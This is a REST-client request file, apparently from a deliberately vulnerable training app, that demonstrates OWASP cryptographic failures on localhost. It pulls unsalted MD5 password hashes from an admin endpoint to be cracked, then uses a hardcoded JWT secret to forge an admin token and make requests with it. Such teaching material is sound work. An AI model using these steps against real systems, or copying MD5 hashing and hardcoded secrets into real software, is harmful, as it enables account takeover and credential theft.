### =============================================================
### OWASP A02 – Cryptographic Failures
### =============================================================
### Two problems:
###   (a) Passwords are hashed with MD5 (no salt, far too fast)
###   (b) The JWT secret "aviato-jwt-signing-key-2024-prod!" is hardcoded (appsettings.json)
### =============================================================

@baseUrl = http://localhost:5218


### --- (a) Make an MD5 password hash visible ---
# 1. Register a new user
POST {{baseUrl}}/auth/register
Content-Type: application/json

{
  "username": "victim",
  "email": "victim@example.com",
  "password": "hunter2"
}

###

### --- (a) Read the MD5 hash from the admin endpoint ---
# The hash for "hunter2" is: 2ab96390c7dbe3439de74d0c9b0b1767
# Paste it into https://crackstation.net/ (or hashcat) – it cracks instantly,
# because unsalted MD5 hashes are precomputed in rainbow tables.
#
# ⚠️ If A01 is already fixed, this needs an admin token:
#    Authorization: Bearer <admin token from 00_setup.http>
GET {{baseUrl}}/admin/users

###

### --- (b) A self-forged JWT signed with the known secret ---
# The secret "aviato-jwt-signing-key-2024-prod!" is hardcoded in appsettings.json.
# Knowing it, an attacker can sign their own admin token on https://jwt.io –
# no login, no password.
#
# Payload (base64url-decoded):
#   {
#     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
#     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "hacker",
#     "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "admin"
#   }
#
# This token was self-signed with HMAC-SHA256 and the known secret:
@forgedAdminToken = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjEiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaGFja2VyIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiYWRtaW4ifQ.mH6v2tBXUqWFW3M2g5s3uSW1kG83L_MhrU4wokfDo-M

# Use the forged token as admin:
GET {{baseUrl}}/orders/my
Authorization: Bearer {{forgedAdminToken}}
